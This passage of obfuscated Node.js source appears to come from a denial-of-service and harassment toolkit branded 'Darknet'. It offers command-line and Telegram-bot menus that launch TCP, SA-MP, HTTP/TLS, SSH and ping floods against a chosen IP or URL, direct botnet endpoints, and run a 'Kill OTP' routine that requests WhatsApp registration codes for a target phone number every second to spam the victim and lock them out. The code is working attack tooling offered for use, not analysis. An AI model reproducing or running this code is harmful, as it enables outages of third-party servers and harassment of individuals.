    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n   \n                    OTP Killer Has Been Launched\n========================================================================\nTarget   : " + _0x425aaa + "\nDuration : " + _0x3dab1a + "\n\nSpamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login");
  } catch (_0x3c892c) {
    console.log("Oops Something Went Wrong");
  }
  const _0x249aad = path.join(__dirname, "/lib/cache/21");
  exec("node " + _0x249aad + " +" + _0x425aaa + " " + _0x3dab1a);
  sigma();
}
;
async function samp(_0x148cdb) {
  if (_0x148cdb.length < 0x3) {
    console.log("Example: .samp <target> <port> <duration>\nsamp 123.456.78.910 7777 300");
    sigma();
    return;
  }
  const [_0x380ee7, _0x46dc46, _0x3d8d3a] = _0x148cdb;
  try {
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n                    SA MP Flood Attack Launched\n========================================================================\nTarget   : " + _0x380ee7 + "\nDuration : " + _0x3d8d3a + "\nMethods  : SAMP Flooder\nCreator  : Darknet");
  } catch (_0x4bcde7) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x2d7b9d = path.join(__dirname, "/lib/cache/22");
  exec("node " + _0x2d7b9d + " " + _0x380ee7 + " " + _0x46dc46 + " " + _0x3d8d3a);
  sigma();
}
;
async function tcp(_0x28bc91) {
  if (_0x28bc91.length < 0x3) {
    console.log("Example: tcp <target> <duration>\ntcp 123.456.78.910 120");
    sigma();
    return;
  }
  const [_0x5c136f, _0x1767df, _0xf9856d] = _0x28bc91;
  try {
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n                    TCP Flood Attack Launched\n========================================================================\nTarget   : " + _0x5c136f + "\nDuration : " + _0xf9856d + "\nMethods  : TCP FLOOD\nCreator  : V3 And Joseph");
  } catch (_0x507044) {
    console.log("Oops Something Went Wrong");
  }
  const _0xb13065 = path.join(__dirname, "/lib/cache/23");
  const _0x58440b = path.join(__dirname, "/lib/cache/1");
  exec("node " + _0xb13065 + " " + _0x5c136f + " " + _0x1767df + " " + _0xf9856d + " 10");
  exec("node " + _0x58440b + " http://" + _0x5c136f + " " + _0xf9856d);
  sigma();
}
;
async function transformBot(_0xd1c0ff) {
  permen.question("Insert Your Telegram Token: ", _0x4db49d => {
    permen.question("Insert Your Telegram ID: ", _0x202757 => {
      const _0x75ca4e = new TelegramBot(_0x4db49d, {
        'polling': true
      });
      console.clear();
      console.log("Successfully Connected With:\nBot Token:\t" + _0x4db49d + "\nChat ID:\t" + _0x202757);
      const _0xd2f3f9 = {
        'parse_mode': 'Markdown',
        'reply_markup': {
          'inline_keyboard': [[{
            'text': "Flood Notification",
            'callback_data': "flood_notif"
          }, {
            'text': "Subdomain Finder",
            'callback_data': 'subdo_finder'
          }], [{
            'text': "Kill OTP",
            'callback_data': "kill_otp"
          }, {
            'text': "Kill SSH",
            'callback_data': "kill_ssh"
          }], [{
            'text': "Kill PING",
            'callback_data': 'kill_ping'
          }, {
            'text': "Killer Digital Ocean",
            'callback_data': 'kill_do'
          }], [{
            'text': "Attack",
            'callback_data': "start_attack"
          }], [{
            'text': "Main Menu",
            'callback_data': 'main_start'
          }], [{
            'text': "Back CLI",
            'callback_data': "back_cli"
          }]]
        }
      };
      const _0x451e19 = {
        'reply_markup': {
          'keyboard': [[{
            'text': "Ninja"
          }, {
            'text': "Tls"
          }], [{
            'text': 'Strike'
          }, {
            'text': "Httpx"
          }], [{
            'text': 'Bypass'
          }, {
            'text': "Thunder"
          }], [{
            'text': "Storm"
          }, {
            'text': 'Glory'
          }], [{
            'text': "Slim"
          }, {
            'text': "Harder"
          }], [{
            'text': "Raw"
          }]],
          'resize_keyboard': true,
          'one_time_keyboard': true
        }
      };
      const _0x27d323 = {
        'parse_mode': "Markdown",
        'reply_markup': {
          'inline_keyboard': [[{
            'text': "Back To Main Menu",
            'callback_data': "main_start"
          }]]
        }
      };
      _0x75ca4e.onText(/\/start/, _0xf4b729 => {
        _0x75ca4e.sendMessage(_0x202757, "Welcome to **Darknet Mode Bot Tele**. Select an option:", _0xd2f3f9);
      });
      _0x75ca4e.on("callback_query", async _0x2c725a => {
        const _0x437fcd = _0x2c725a.data;
        switch (_0x437fcd) {
          case "main_start":
            await _0x75ca4e.sendMessage(_0x202757, "Welcome to **Darknet Mode Bot Tele**. Select an option:", _0xd2f3f9);
            break;
          case "kill_ssh":
            await _0x507b66(_0x202757, _0x75ca4e);
            break;
          case "flood_notif":
            await _0x2f1e83(_0x202757, _0x75ca4e);
            break;
          case 'subdo_finder':
            await _0x4ab4cc(_0x202757, _0x75ca4e);
            break;
          case "kill_ping":
            await _0x174a32(_0x202757, _0x75ca4e);
            break;
          case "kill_do":
            await _0x351e8e(_0x202757, _0x75ca4e);
            break;
          case "kill_otp":
            await _0x21521f(_0x202757, _0x75ca4e);
            break;
          case "start_attack":
            await _0x396c29(_0x202757, _0x75ca4e);
            break;
          case 'back_cli':
            await _0x75ca4e.sendMessage(_0x202757, "Bot Will Stop And Back To CLI Mode.");
            await _0x75ca4e.stopPolling();
            await banner();
            sigma();
            break;
          default:
            _0x75ca4e.sendMessage(_0x202757, "Unknown action.");
            break;
        }
      });
      async function _0x351e8e(_0x5a22ff, _0x11749b) {
        const _0xb36cdd = path.join(__dirname, "/lib/cache/19");
        const _0x355000 = path.join(__dirname, "/lib/cache/3");
        const _0xe5baf7 = path.join(__dirname, '/lib/cache/14');
        _0x11749b.sendMessage(_0x5a22ff, "Enter Target URL:");
        _0x11749b.once("message", async _0x1c055b => {
          const _0x518c86 = _0x1c055b.text;
          _0x11749b.sendMessage(_0x5a22ff, "Enter Target IP:");
          _0x11749b.once("message", async _0x59edc0 => {
            const _0x57f5aa = _0x59edc0.text;
            _0x11749b.sendMessage(_0x5a22ff, "Enter Duration:");
            _0x11749b.once('message', async _0x5a3898 => {
              const _0xd95e5b = parseInt(_0x5a3898.text);
              _0x11749b.sendMessage(_0x5a22ff, "Attack Started\n**Digital Ocean Killer**\n**Target URL:** " + _0x518c86 + "\n**Target IP:** " + _0x57f5aa + "\n**Duration:** " + _0xd95e5b, _0x27d323);
              const _0x1aeb2a = spawn('node', [_0xb36cdd, _0x57f5aa, '22', "root", _0xd95e5b], {
                'detached': true,
                'stdio': "ignore"
              });
              const _0x34342d = spawn("node", [_0x355000, _0x518c86, _0xd95e5b], {
                'detached': true,
                'stdio': "ignore"
              });
              const _0xfbc673 = spawn("node", [_0xe5baf7, "http://" + _0x57f5aa, _0xd95e5b], {
                'detached': true,
                'stdio': 'ignore'
              });
              _0xfbc673.unref();
              _0x34342d.unref();
              _0x1aeb2a.unref();
            });
          });
        });
      }
      async function _0x396c29(_0x5e2642, _0x2b9176) {
        _0x2b9176.sendMessage(_0x5e2642, "Select Attack Methods:", _0x451e19);
        _0x2b9176.once("message", async _0x29bebe => {
          const _0x1cc571 = _0x29bebe.text;
          let _0x358e9c = '';
          let _0x498f45 = '';
          let _0x4f12d9 = '';
          let _0x9f5814 = '';
          let _0x160a9c = '';
          const _0xdf1f2f = path.join(__dirname, "/lib/cache/3");
          const _0x24c616 = path.join(__dirname, '/lib/cache/4');
          const _0x46be7d = path.join(__dirname, "/lib/cache/5");
          const _0x4d6638 = "node " + _0xdf1f2f + " " + _0x9f5814 + " " + _0x160a9c + " 100 1 proxy.txt";
          const _0x343609 = "node " + _0x24c616 + " " + _0x9f5814 + " " + _0x160a9c + " 100 15 proxy.txt";
          const _0x1ef652 = "node " + _0x46be7d + " " + _0x9f5814 + " " + _0x160a9c + " 60 7 proxy.txt";
          if (_0x1cc571 === "Ninja") {
            _0x358e9c = "ninja";
            _0x498f45 = path.join(__dirname, "/lib/cache/3");
            _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c;
          } else {
            if (_0x1cc571 === "Raw") {
              _0x358e9c = "raw";
              _0x498f45 = path.join(__dirname, "/lib/cache/16");
              _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c;
            } else {
              if (_0x1cc571 === 'Strike') {
                _0x358e9c = '11';
                _0x498f45 = path.join(__dirname, '/lib/cache/11');
                _0x4f12d9 = "node " + _0x498f45 + " GET " + _0x9f5814 + " " + _0x160a9c + " 10 90 proxy.txt --full";
              } else {
                if (_0x1cc571 === 'Storm') {
                  _0x358e9c = 'storm';
                  _0x498f45 = path.join(__dirname, "/lib/cache/13");
                  _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c + " 100 10 proxy.txt";
                } else {
                  if (_0x1cc571 === "Tls") {
                    _0x358e9c = "tls";
                    _0x498f45 = path.join(__dirname, "/lib/cache/2");
                    _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c;
                  } else {
                    if (_0x1cc571 === 'Glory') {
                      _0x358e9c = "glory";
                      _0x498f45 = path.join(__dirname, '/lib/cache/5');
                      _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c + " 32 10 proxy.txt";
                    } else {
                      if (_0x1cc571 === 'Harder') {
                        _0x358e9c = "harder";
                        _0x498f45 = path.join(__dirname, '/lib/cache/4');
                        _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c + " 32 10 proxy.txt";
                      } else {
                        if (_0x1cc571 === "Bypass") {
                          _0x358e9c = "bypass";
                          _0x498f45 = path.join(__dirname, "/lib/cache/9");
                          _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c + " 100 10 proxy.txt";
                        } else {
                          if (_0x1cc571 === "Httpx") {
                            _0x358e9c = 'httpx';
                            _0x498f45 = path.join(__dirname, "/lib/cache/6");
                            _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c + " 50 4 proxy.txt";
                          } else {
                            if (_0x1cc571 === "Thunder") {
                              _0x358e9c = 'thunder';
                              _0x498f45 = path.join(__dirname, "/lib/cache/10");
                              _0x4f12d9 = "node " + _0x498f45 + " " + _0x9f5814 + " " + _0x160a9c + " 50 10 proxy.txt";
                            } else {
                              if (_0x1cc571 === "Slim") {
                                _0x2b9176.sendMessage(_0x5e2642, "Nice Choices.");
                              } else {
                                _0x2b9176.sendMessage(_0x5e2642, "Undefined Methods");
                                return;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
          _0x2b9176.sendMessage(_0x5e2642, "Enter Target Link:");
          _0x2b9176.once("message", async _0x25421e => {
            _0x9f5814 = _0x25421e.text;
            _0x2b9176.sendMessage(_0x5e2642, "Enter Duration:");
            _0x2b9176.once("message", async _0x2c3989 => {
              _0x160a9c = parseInt(_0x2c3989.text);
              await _0x2b9176.sendMessage(_0x5e2642, "Attack Launched\nMethods: " + _0x1cc571 + "\nTarget: " + _0x9f5814 + "\nDuration\b" + _0x160a9c + "\nCreator: V3 ");
              if (_0x1cc571 === "Slim") {
                const _0x2a6aed = spawn(_0x4d6638, {
                  'detached': true,
                  'stdio': "ignore"
                });
                const _0x3188d7 = spawn(_0x343609, {
                  'detached': true,
                  'stdio': "ignore"
                });
                const _0x26bf74 = spawn(_0x1ef652, {
                  'detached': true,
                  'stdio': "ignore"
                });
                _0x2a6aed.unref();
                _0x3188d7.unref();
                _0x26bf74.unref();
              } else {
                exec(_0x4f12d9);
              }
            });
          });
        });
      }
      async function _0x4ab4cc(_0x37c433, _0x1f2aac) {
        _0x1f2aac.sendMessage(_0x37c433, "Enter domain\nExample: google.com");
        _0x1f2aac.once('message', async _0x2b0e8a => {
          try {
            let _0x758bb5 = await axios.get("https://api.agatz.xyz/api/subdomain?url=" + _0x2b0e8a.text);
            let _0x357f90 = [...new Set(_0x758bb5.data.data)];
            let _0x6e77c = _0x357f90.map(_0x558075 => {
              return '' + _0x558075;
            }).join("\n");
            _0x1f2aac.sendMessage(_0x37c433, "**Subdomain Finder** For " + _0x2b0e8a.text + "\n" + _0x6e77c, _0x27d323);
          } catch (_0x55f57b) {
            _0x1f2aac.sendMessage(_0x37c433, "Error fetching subdomains. Please try again later.");
          }
        });
      }
      async function _0x2f1e83(_0x32b4cf, _0x29c6a2) {
        _0x29c6a2.sendMessage(_0x32b4cf, "Enter target phone number:");
        _0x29c6a2.once("message", async _0x4129c6 => {
          const _0xb0c92 = _0x4129c6.text.replace(/\D/g, '');
          _0x29c6a2.sendMessage(_0x32b4cf, "Enter duration in seconds:");
          _0x29c6a2.once('message', async _0x47bed6 => {
            const _0x287e7d = parseInt(_0x47bed6.text, 0xa);
            if (isNaN(_0x287e7d) || _0x287e7d <= 0x0) {
              _0x29c6a2.sendMessage(_0x32b4cf, "Invalid duration.");
            } else {
              _0x29c6a2.sendMessage(_0x32b4cf, "Starting **flood notification** to " + _0xb0c92 + " for " + _0x287e7d + " seconds.", {
                'parse_mode': 'Markdown'
              });
              await _0x4f54b9(_0xb0c92, _0x287e7d, _0x32b4cf, _0x29c6a2);
            }
          });
        });
      }
      async function _0x21521f(_0x184f99, _0xe94c51) {
        _0xe94c51.sendMessage(_0x184f99, "Enter target phone number:");
        _0xe94c51.once('message', async _0x2e5192 => {
          let _0x9178dd = '+' + parseInt(_0x2e5192.text);
          _0xe94c51.sendMessage(_0x184f99, "Enter duration in seconds:");
          _0xe94c51.once("message", async _0x32b82d => {
            const _0x2ce5ba = parseInt(_0x32b82d.text, 0xa);
            if (isNaN(_0x2ce5ba) || _0x2ce5ba <= 0x0) {
              _0xe94c51.sendMessage(_0x184f99, "Invalid duration.");
            } else {
              _0xe94c51.sendMessage(_0x184f99, "Starting **flood notification** to " + _0x9178dd + " for " + _0x2ce5ba + " seconds.", {
                'parse_mode': "Markdown"
              });
              await _0x12bcef(_0x9178dd, _0x2ce5ba, _0x184f99, _0xe94c51);
            }
          });
        });
      }
      async function _0x174a32(_0x3d3280, _0x38cc87) {
        const _0x51d20c = path.join(__dirname, "/lib/cache/18");
        _0x38cc87.sendMessage(_0x3d3280, "Enter target IP Address:");
        _0x38cc87.once("message", async _0x25e9ef => {
          const _0x2ca9f9 = _0x25e9ef.text;
          _0x38cc87.sendMessage(_0x3d3280, "Enter duration in seconds:");
          _0x38cc87.once("message", async _0x3d86bf => {
            const _0x150347 = parseInt(_0x3d86bf.text, 0xa);
            if (isNaN(_0x150347) || _0x150347 <= 0x0) {
              _0x38cc87.sendMessage(_0x3d3280, "Invalid duration.");
            } else {
              _0x38cc87.sendMessage(_0x3d3280, "Attack Started\n**Methods:** KILL PING\n**Target:** " + _0x2ca9f9 + "\n**Duration:** " + _0x150347, _0x27d323);
              exec("node " + _0x51d20c + " " + _0x2ca9f9 + " 65500 10 10 " + _0x150347);
            }
          });
        });
      }
      async function _0x507b66(_0x3f190a, _0x5ba251) {
        const _0x3c700d = path.join(__dirname, "/lib/cache/19");
        _0x5ba251.sendMessage(_0x3f190a, "Enter target IP Address:");
        _0x5ba251.once("message", async _0x550f8d => {
          const _0x39582d = _0x550f8d.text;
          _0x5ba251.sendMessage(_0x3f190a, "Enter target Port:");
          _0x5ba251.once("message", async _0x4da01f => {
            const _0x1fcc56 = _0x4da01f.text;
            _0x5ba251.sendMessage(_0x3f190a, "Enter duration in seconds:");
            _0x5ba251.once("message", async _0x5886fc => {
              const _0x2376bf = parseInt(_0x5886fc.text, 0xa);
              if (isNaN(_0x2376bf) || _0x2376bf <= 0x0) {
                _0x5ba251.sendMessage(_0x3f190a, "Invalid duration.");
              } else {
                _0x5ba251.sendMessage(_0x3f190a, "Attack Started\n**Methods:** KILL SSH\n**Target:** " + _0x39582d + "\n**Port:** " + _0x1fcc56 + "\n**Duration:** " + _0x2376bf, _0x27d323);
                exec("node " + _0x3c700d + " " + _0x39582d + " " + _0x1fcc56 + " root " + _0x2376bf);
              }
            });
          });
        });
      }
      async function _0x12bcef(_0x1e2d8d, _0x2723e2, _0x26ac66, _0x957a36) {
        const _0x5b2177 = parsePhoneNumberFromString(_0x1e2d8d);
        const _0x2160db = _0x5b2177.countryCallingCode;
        const _0x3d90f8 = _0x5b2177.nationalNumber;
        try {
          const {
            state: _0x29b6c6,
            saveState: _0x44aba7
          } = await useMultiFileAuthState('sessions');
          const _0x626917 = pino({
            'level': "silent"
          });
          const _0x37300f = makeWaSocket({
            'auth': _0x29b6c6,
            'mobile': true,
            'logger': _0x626917
          });
          _0x957a36.sendMessage(_0x26ac66, "Kill OTP Started\n**Target:** " + _0x1e2d8d + "\n**Duration:** " + _0x2723e2 + "\n**Creator: PermenMD**", _0x27d323);
          const _0x598cfb = async () => {
            try {
              await _0x37300f.requestRegistrationCode({
                'phoneNumber': '+' + _0x1e2d8d,
                'phoneNumberCountryCode': _0x2160db,
                'phoneNumberNationalNumber': _0x3d90f8,
                'phoneNumberMobileCountryCode': _0x2160db
              });
            } catch (_0x19fe73) {
              if (_0x19fe73.reason === 'temporarily_unavailable') {
                clearInterval(_0x1bc529);
                console.log("Temporarily unavailable, restarting...");
                setTimeout(() => {
                  _0x1bc529 = setInterval(_0x598cfb, 0x3e8);
                }, 0x2710);
              } else {
                console.log("Error:", _0x19fe73);
              }
            }
          };
          let _0x1bc529 = setInterval(_0x598cfb, 0x3e8);
          setTimeout(() => {
            clearInterval(_0x1bc529);
            _0x957a36.sendMessage(_0x26ac66, "Kill OTP stopped after " + _0x2723e2 + " seconds.");
          }, _0x2723e2 * 0x3e8);
        } catch (_0x2703eb) {
          console.log("Error during flooder initialization:", _0x2703eb);
        }
      }
      async function _0x4f54b9(_0x278974, _0x4dce52, _0x5b6bb9, _0x1bac79) {
        try {
          const {
            state: _0x24751c,
            saveState: _0x2562c8
          } = await useMultiFileAuthState('sessions');
          _0x1bac79.sendMessage(_0x5b6bb9, "Pairing Code Flooder Started\n**Target:** " + _0x278974 + "\n**Duration:** " + _0x4dce52 + "\n**Creator: PermenMD**", _0x27d323);
          let _0x13ecdc = setInterval(async () => {
            try {} catch (_0x582d83) {}
          }, 0x3e8);
          setTimeout(() => {
            clearInterval(_0x13ecdc);
            _0x1bac79.sendMessage(_0x5b6bb9, "Flooding ended.");
          }, _0x4dce52 * 0x3e8);
        } catch (_0x5adf20) {}
      }
    });
  });
}
async function chat_ai() {
  permen.question("[[1m[31m Chat AI[0m]: \n", async _0x1f8778 => {
    if (_0x1f8778 === "exit") {
      console.log("Chat Ai Has Ended");
      sigma();
    } else {
      try {
        let _0xf5b063 = await axios.get("https://widipe.com/gpt4?text=" + _0x1f8778);
        let _0x4a31f2 = await _0xf5b063.data;
        console.log("\n[ Ragbot ]:\n" + _0x4a31f2.data + "\n");
      } catch (_0x438627) {
        console.log(_0x438627);
      }
      chat_ai();
    }
  });
}
async function sigma() {
  const _0x39858f = await fetch("https://raw.githubusercontent.com/permenmd/cache/main/news.txt");
  const _0x44dad9 = await _0x39858f.text();
  permen.question("[[1m[32mDarknet[0m]: ", _0x20cfa1 => {
    const [_0x301411, ..._0xd0d100] = _0x20cfa1.trim().split(" ");
    if (_0x301411 === "help") {
      console.log("\nNAME      │ ALIAS              │ DESCRIPTION\n──────────┼────────────────────┼────────────────────────────────────\n help     │ ----               │ Menunjukan Semua Command\n methods  │ ----               │ Menunjukan Semua Methods\n clear    │ ----               │ Menunjukan Banner mu\n ongoing  │ ----               │ Menumjukan serangan\n tutorial │ ----               │ Tutorial Penggunaan\n credits  │ ----               │ credits\n news     │ ----               │ Melihat news update\n bot-tele │ ----               │ Mengubah Menjadi Bot Tele\n");
      sigma();
    } else {
      if (_0x301411 === "botnet-methods") {
        console.log("\n█░░ ▄▀█ █▄█ █▀▀ █▀█ ▀▀█     \n█▄▄ █▀█ ░█░ ██▄ █▀▄ ░░█ \n\n| - https     \n| - ninja\n| - flood\n| - bypass\n| - mix\n| - raw\n| - strike\n| - tls\n| - tlsv2\n| - storm\n| - destroy\n| - httpx\n| - java\n| - nuke\n| - harder\n| - http-raw\n| - sigma\n| - glory\n| - pluto\n\n");
        sigma();
      } else {
        if (_0x301411 === "methods") {
          methods();
          sigma();
        } else {
          if (_0x301411 === "news") {
            console.log("\n" + _0x44dad9);
            sigma();
          } else {
            if (_0x301411 === "bot-tele") {
              transformBot(_0xd0d100);
              sigma();
            } else {
              if (_0x301411 === "credits") {
                console.log("\n\nCreated And Coded Full By V3\n\nThx To:\nAllah SWT\nPermen (base)\nJoseph Sikma (My Friend)\nRyan Dahl (pembuat nodejs)\nChat Gpt \n");
                sigma();
              } else {
                if (_0x301411 === "gataulah") {
                  handleAttackCommand(_0xd0d100);
                } else {
                  if (_0x301411 === "tutorial") {
                    console.log("\n Tutorial Menggunakan\n methods target port time\n contoh => tls https://website.com 443 60");
                    sigma();
                  } else {
                    if (_0x301411 === 'udp-raw') {
                      udp_flood(_0xd0d100);
                    } else {
                      if (_0x301411 === 'flood') {
                        flood(_0xd0d100);
                      } else {
                        if (_0x301411 === "tls") {
                          tls(_0xd0d100);
                        } else {
                          if (_0x301411 === "ninja") {
                            ninja(_0xd0d100);
                          } else {
                            if (_0x301411 === 'harder') {
                              harder(_0xd0d100);
                            } else {
                              if (_0x301411 === "glory") {
                                glory(_0xd0d100);
                              } else {
                                if (_0x301411 === "httpx") {
                                  httpx(_0xd0d100);
                                } else {
                                  if (_0x301411 === "sigma") {
                                    sigma(_0xd0d100);
                                  } else {
                                    if (_0x301411 === 'bomb') {
                                      bomb(_0xd0d100);
                                    } else {
                                      if (_0x301411 === "bypass") {
                                        bypass(_0xd0d100);
                                      } else {
                                        if (_0x301411 === "java") {
                                          java(_0xd0d100);
                                        } else {
                                          if (_0x301411 === "strike") {
                                            strike(_0xd0d100);
                                          } else {
                                            if (_0x301411 === "pluto") {
                                              pluto(_0xd0d100);
                                            } else {
                                              if (_0x301411 === "storm") {
                                                storm(_0xd0d100);
                                              } else {
                                                if (_0x301411 === "raw") {
                                                  raw(_0xd0d100);
                                                } else {
                                                  if (_0x301411 === "stars") {
                                                    stars(_0xd0d100);
                                                  } else {
                                                    if (_0x301411 === "http1") {
                                                      http1(_0xd0d100);
                                                    } else {
                                                      if (_0x301411 === "kill-do") {
                                                        killDo(_0xd0d100);
                                                      } else {
                                                        if (_0x301411 === "samp") {
                                                          samp(_0xd0d100);
                                                        } else {
                                                          if (_0x301411 === 'kill-otp') {
                                                            killOTP(_0xd0d100);
                                                          } else {
                                                            if (_0x301411 === 'tcp') {
                                                              tcp(_0xd0d100);
                                                            } else {
                                                              if (_0x301411 === "spampair") {
                                                                SpamPair(_0xd0d100);
                                                              } else {
                                                                if (_0x301411 === "kill-ping") {
                                                                  pod(_0xd0d100);
                                                                } else {
                                                                  if (_0x301411 === "add-botnet") {
                                                                    processBotnetEndpoint(_0xd0d100);
                                                                  } else {
                                                                    if (_0x301411 === "botnet-test") {
                                                                      checkBotnetEndpoints();
                                                                    } else {
                                                                      if (_0x301411 === "botnet") {
                                                                        AttackBotnetEndpoints(_0xd0d100);
                                                                      } else {
                                                                        if (_0x301411 === "ongoing") {
                                                                          ongoingAttack();
                                                                          sigma();
                                                                        } else {
                                                                          if (_0x301411 === 'ai') {
                                                                            console.log("ZyoJir Ai Ragbot Started\nType \"exit\" To Stop Chat");
                                                                            chat_ai();
                                                                          } else if (_0x301411 === "clear") {
                                                                            banner();
                                                                            sigma();
                                                                          } else {
